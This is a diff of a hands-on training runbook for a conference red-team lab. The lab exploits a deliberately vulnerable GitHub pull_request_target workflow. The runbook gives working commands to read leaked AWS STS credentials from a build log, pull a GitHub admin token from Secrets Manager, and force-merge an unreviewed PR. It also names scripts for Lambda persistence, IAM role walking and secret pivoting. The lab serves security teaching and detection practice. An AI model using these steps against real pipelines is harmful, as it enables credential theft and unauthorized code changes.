@@ -1,118 +1,238 @@
-# Attendee Runbook: CI/CD Red Team Tactic
+# Attendee Runbook: Trust the Pipeline, Lose the Kingdom
 
-**Time budget: 15 minutes to complete the hands-on.**
+This is the live Red Team Village lab path. In the room, students run the core exploit live:
 
-By the end of this runbook you will have force-merged your own pull request against a repo you do not own, using AWS credentials that did not exist until you opened the PR. Your handle will land on the live trophy wall after the protected deploy workflow runs.
+```text
+PR → STS → demo secret → merge
+```
 
-Live landing page during training: `https://x90sky.sh/rtv`
-Trophy wall: `https://pipeline-demo-lab.github.io/cicd-demo/`
+The advanced cloud-native chain is taught with slides, logs, diagrams, and code artifacts during the hour. The public Terraform/code bundle is the take-home reproduction path for running the full chain later in a dedicated, empty AWS account you control.
 
-## What you need before you start
+## Safety contract
 
-- A GitHub account (can be freshly created).
-- AWS CLI installed on your laptop and on PATH. `aws --version` should return something.
-- `curl` and `jq` installed. `jq --version` should return something.
-- Any working internet path (conference WiFi, hotspot, tethering). You'll make API calls to `*.amazonaws.com` and `api.github.com`.
+Everything in this lab is intentionally vulnerable and intentionally bounded.
 
-You do NOT need an AWS account of your own. You'll use temporary credentials minted for you by the demo workflow.
+- Use only the demo repository, demo AWS account, and handles assigned for this session.
+- Do not use personal/work tokens, employer accounts, or real secrets.
+- The live room path stops after the trophy-wall merge unless the facilitator explicitly says otherwise.
+- Advanced Lambda/EventBridge, IAM graph, and pivot-secret material is shown through artifacts/code in the live hour.
+- If your laptop or Wi-Fi fights you, pair with a neighbor and stay with the trust graph. The public bundle lets you rerun later.
 
-## Step 1: Fork the demo repo
+## 60-minute map
 
-1. Browse to the demo repo URL the presenter displays at session start.
-2. Click **Fork** in the top right. Fork into your own account.
+- 00–10: room contract, safety model, architecture.
+- 10–30: live hands-on — PR to merge authority.
+- 30–44: advanced chain — slides, logs, code artifacts, diagrams.
+- 44–54: detections and defenses.
+- 54–60: Terraform/code takeaway, troubleshooting, close.
 
-## Step 2: Open a PR from your fork
+## Prereqs
 
-1. On your fork, choose **Add file**, then **Create new file**.
-2. Name the file `submissions/<handle>.json`, replacing `<handle>` with your GitHub handle or conference alias.
-3. Paste this JSON and change the values:
+You need:
+
+- GitHub account.
+- Browser signed into GitHub.
+- Terminal with `aws`, `jq`, and `curl` if possible.
+- Assigned handle from the room facilitator, for example `student07`.
+
+Set your handle:
+
+```bash
+export RTV_HANDLE="student07"
+export AWS_REGION="us-east-1"
+```
+
+Replace `student07` with your assigned handle.
+
+## Live hands-on: PR to merge authority
+
+### 1. Fork the demo repo
+
+Open the public demo repo URL shown on the room slide and click **Fork**.
+
+### 2. Add your submission
+
+In your fork, create:
+
+```text
+submissions/<your-handle>.json
+```
+
+Example:
 
 ```json
 {
-  "handle": "alice",
-  "message": "pipeline owned"
+  "handle": "student07",
+  "timestamp": "2026-08-08T00:00:00Z"
 }
 ```
 
-4. Scroll down, select **"Create a new branch for this commit and start a pull request"**, and click **Propose changes**.
-5. Click **Create pull request** on the next screen.
+### 3. Open a PR back to the demo repo
 
-Your PR will appear on the original demo repo (not your fork).
+Open a pull request from your fork to the room demo repo.
 
-## Step 3: Watch the workflow run fire
+The vulnerable `pull_request_target` workflow runs in the target repository context.
 
-1. On the demo repo's PR page, click the **Checks** tab.
-2. The workflow run named **"Demo CI (Intentionally Vulnerable)"** fires automatically.
-3. Click the job name and wait for the `Exchange OIDC for STS and dump to log` step to finish (~10 seconds).
+### 4. Read temporary AWS credentials from your workflow log
 
-## Step 4: Read your credentials from the workflow log
+Open the Actions run for your PR. Find the copy-ready `export` lines and paste them into your terminal.
 
-Expand the `Exchange OIDC for STS and dump to log` step. You will see a block like:
+You should end up with:
 
-```
-============================================================
-  STS CREDENTIALS (copy into your terminal verbatim)
-  Valid until: 2026-04-22T18:15:00Z
-============================================================
-export AWS_ACCESS_KEY_ID=ASIA...
+```bash
+export AWS_ACCESS_KEY_ID=...
 export AWS_SECRET_ACCESS_KEY=...
 export AWS_SESSION_TOKEN=...
 export AWS_REGION=us-east-1
-============================================================
 ```
 
-**Copy the four `export` lines exactly as printed and paste them into your own terminal.**
-
-You now hold live AWS credentials against the lab account. You have 15 minutes before they expire.
-
-## Step 5: Pull the GitHub admin PAT from Secrets Manager
-
-In the same terminal that has the exports set:
+Verify:
 
 ```bash
-PAT=$(aws secretsmanager get-secret-value \
+aws sts get-caller-identity
+```
+
+Teaching point:
+
+```text
+Temporary means expiring, not unstealable.
+```
+
+### 5. Pull the demo GitHub token from Secrets Manager
+
+```bash
+export RTV_PAT="$(aws secretsmanager get-secret-value \
   --secret-id demo/github-pat \
-  --query SecretString --output text)
-echo "$PAT"
+  --query SecretString \
+  --output text)"
 ```
 
-You should see a `ghp_...` or `github_pat_...` token print. That's a GitHub admin PAT for the isolated demo org only. It was never supposed to leave AWS.
+Teaching point:
 
-## Step 6: Force-merge your own PR
+```text
+The AWS role is narrow. The secret is not.
+```
 
-Still in the same terminal. Replace `<DEMO_ORG>`, `<DEMO_REPO>`, and `<PR_NUMBER>`, or copy the ready made `curl` command from your workflow log.
+### 6. Merge your own PR
+
+Set these from the room slide / your PR URL:
 
 ```bash
-curl -X PUT \
-  -H "Authorization: token $PAT" \
-  -H "Accept: application/vnd.github+json" \
-  "https://api.github.com/repos/<DEMO_ORG>/<DEMO_REPO>/pulls/<PR_NUMBER>/merge"
+export DEMO_ORG="pipeline-demo-lab"
+export DEMO_REPO="cicd-demo"
+export PR_NUMBER="<your-pr-number>"
 ```
 
-Refresh your PR page in the browser. It should flip from **Open** to **Merged**. No one reviewed it. No human clicked approve. You merged it with a credential that did not exist when you opened the PR. After the deploy workflow finishes, refresh the trophy wall and find your handle.
+Merge:
 
-## What just happened
+```bash
+curl -sS -X PUT \
+  -H "Authorization: token ${RTV_PAT}" \
+  -H "Accept: application/vnd.github+json" \
+  "https://api.github.com/repos/${DEMO_ORG}/${DEMO_REPO}/pulls/${PR_NUMBER}/merge" | jq .
+```
 
-1. Your PR triggered a `pull_request_target` workflow in the demo repo.
-2. That workflow ran with GitHub OIDC trust into an AWS IAM role.
-3. The workflow minted an STS session and printed it to the build log. The build log is public.
-4. The IAM role had only one permission: read one Secrets Manager secret. You used it to pull the PAT.
-5. The PAT had `repo` scope on the demo org. You used it to force-merge your own PR.
-6. A protected deploy workflow validated your JSON and published the trophy wall.
+Refresh your PR and the trophy wall.
 
-The attack did not require a C2. It did not require an implant. It did not require your laptop to be reachable from anywhere. The build log was the exfil channel, the IAM role was the pivot, and the PAT was the escalation.
+Key line:
 
-This is the tj-actions (March 2025) and TeamPCP (March 2026) pattern, minus the stealth layer.
+```text
+You merged it with a credential that did not exist when you opened the PR.
+```
 
-## If something breaks
+At this point, pause live commands and follow the facilitator through the advanced chain artifacts.
 
-- **`aws: command not found`**: install the AWS CLI before continuing. `brew install awscli` on Mac, package manager on Linux, MSI installer on Windows.
-- **`Unable to locate credentials`**: your paste didn't take. Re-paste the four `export` lines.
-- **`The security token included in the request is expired`**: your session timed out (15 min). Close and reopen your PR to get a fresh workflow run.
-- **`You do not have permission to merge this pull request`**: the PAT value is wrong or the PAT was rotated. Check `echo "$PAT"` shows something that looks like a token.
-- **`Pull Request is not mergeable`**: someone else merged your PR. Check the PR UI. If it says Merged, you already won.
-- **Workflow does not fire**: the presenter will confirm the lab runner pool is up. If it's a queueing issue, wait. If it's a config issue, the presenter will re-check "Fork pull request workflows from outside collaborators."
+## Advanced chain: taught with artifacts/code
 
-## After the session
+The same trust mistake can continue beyond the live room path. During the session, the facilitator walks through code snippets, pre-captured logs, and diagrams for the rest of the chain.
 
-You can review or reproduce the attendee-safe lab path against a dedicated, empty AWS account you control using the public bundle at `https://github.com/x90skysn3k/rtv-cicd-attack-chain`. The bundle includes the Part A lab, public handouts, and detection examples; presenter-only infrastructure and operator runbooks stay private.
+### Controlled serverless persistence
+
+Artifact/code path:
+
+```bash
+./lab/20-deploy-persistence.sh "${RTV_HANDLE}"
+```
+
+What the artifact demonstrates:
+
+- handle/session-prefixed Lambda resources;
+- a short-lived EventBridge/Scheduler trigger;
+- proof output from logs;
+- cleanup by session/handle.
+
+Teaching point:
+
+```text
+No implant. No endpoint. No C2. Still durable cloud control-plane behavior.
+```
+
+### IAM graph walk
+
+Artifact/code path:
+
+```bash
+./lab/30-assume-demo-role.sh "${RTV_HANDLE}"
+```
+
+What the artifact demonstrates:
+
+- exactly one intended demo role edge;
+- denied output for paths outside the lab graph;
+- IAM trust policies as graph edges, not isolated policy blobs.
+
+Teaching point:
+
+```text
+Trust policies are graph edges. Attackers walk graphs.
+```
+
+### Controlled secrets pivot
+
+Artifact/code path:
+
+```bash
+./lab/40-read-demo-pivot-secrets.sh "${RTV_HANDLE}"
+```
+
+Demo categories:
+
+- `demo/pivot/code-hosting-admin-token`
+- `demo/pivot/ci-platform-admin-key`
+- `demo/pivot/data-warehouse-creds`
+- `demo/pivot/saas-api-key`
+
+These must be fake/demo values only.
+
+Teaching point:
+
+```text
+AWS is not the destination. The secret store is the bridge to everything around AWS.
+```
+
+## Find yourself in the logs
+
+During the detection section, look for:
+
+- GitHub PR/workflow events;
+- `AssumeRoleWithWebIdentity`;
+- `GetSecretValue` for the demo PAT;
+- Lambda/EventBridge/Scheduler creation from the artifact walkthrough;
+- `AssumeRole` graph movement from the artifact walkthrough;
+- demo pivot-secret reads from the artifact walkthrough.
+
+Teaching point:
+
+```text
+You generated the first pivot live. Now learn how to find the rest of the chain.
+```
+
+## Take-home Terraform/code
+
+After the session, use the public bundle to reproduce the environment in an empty AWS account you control:
+
+```text
+https://github.com/x90skysn3k/rtv-cicd-attack-chain
+```
+
+The live session avoids Terraform so the hour stays focused on the attack graph, not provider downloads and state management.
